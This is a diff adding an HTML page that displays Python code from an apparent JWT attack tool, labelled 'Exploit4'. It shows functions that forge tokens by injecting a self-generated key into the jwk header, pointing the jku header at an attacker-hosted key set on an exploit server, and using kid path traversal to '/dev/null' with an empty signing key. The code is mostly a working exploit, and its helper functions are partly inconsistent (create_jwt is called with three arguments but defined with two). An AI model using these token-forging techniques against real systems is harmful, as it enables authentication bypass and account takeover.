@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit4 Code</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/styles/default.min.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@400;700&display=swap">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            document.querySelectorAll('pre code').forEach((block) => {
+                hljs.highlightBlock(block);
+            });
+        });
+    </script>
+    <style>
+        pre {
+            background-color: #f8f8f8;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: 'Sans-serif', monospace; /* 폰트 변경 */
+            line-height: 1.6; /* 텍스트 간격 증가 */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Exploit4 Code</h2>
+
+        <pre><code class="python">
+token4_1 = autojwt.exploit4_1(mheader, mpayload)
+token4_2 = autojwt.exploit4_2(mheader, mpayload)
+token4_3 = autojwt.exploit4_3(mheader, mpayload)
+        </code></pre>
+            
+        <pre><code class="python">
+def exploit4_1(header, payload):
+    public_key = load_public_key()
+    try:
+        jwk = json.loads(pem_to_jwk(public_key, header['kid']))
+    except:
+        jwk = json.loads(pem_to_jwk(public_key))
+    
+    ex_header = copy.deepcopy(header)
+    ex_header['jwk'] = jwk
+    ex_header['alg'] = 'RS256'
+    
+    private_key = load_private_key()
+    modifiedToken = create_jwt(ex_header, payload, private_key)
+    return modifiedToken
+        </code></pre>
+
+        <pre><code class="python">
+def exploit4_2(header, payload):
+    if header['alg'] == 'HS256': # 대칭키는 해당사항 없음
+        return None
+    
+    # 공개 키와 kid 캐싱
+    public_key, kid = get_cached_jwk()
+
+    #jku header 변조
+    ex_header = copy.deepcopy(header)
+    ex_header['jku'] = 'https://exploit-0a9d007803ff6d32803384d3010800b9.exploit-server.net/jwks.json'#'http://43.201.70.20:5000/jwks.json'
+    ex_header['kid'] = kid
+    
+    private_key = load_private_key()
+    modifiedToken = create_jwt(ex_header, payload, private_key) #변조한 토큰 생성
+    return modifiedToken
+        </code></pre>
+
+        <pre><code class="python">
+def exploit4_3(header, payload):
+    if header['alg'] == 'RS256': # 비대칭키는 해당사항 없음
+        return None
+        
+    ex_header = copy.deepcopy(header)
+    ex_header['kid'] = '../../../../../dev/null'
+    modifiedToken = create_jwt(ex_header, payload, '') #변조한 토큰 생성
+    return modifiedToken
+        </code></pre>
+
+        <pre><code class="python">
+def create_jwt(header, payload):
+    algorithm = header.get('alg')
+    created_token = ''
+
+    if algorithm == 'RS256':
+        private_key = secret
+        created_token = jwt.encode(payload, private_key, algorithm=algorithm, headers=header)
+    elif algorithm == 'HS256':
+        created_token = jwt.encode(payload, secret, algorithm=algorithm, headers=header)
+    return created_token
+
+        <pre><code class="python">
+def load_private_key(file_path='private_key.pem'):
+    with open(file_path, 'rb') as f:
+        private_key = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())
+        return private_key
+
+def load_public_key(file_path='public_key.pem'):
+    with open(file_path, 'rb') as f:
+        public_key = serialization.load_pem_public_key(f.read(), backend=default_backend())
+        return public_key
+  
+        </code></pre>
+    </div>
+</body>
+</html>
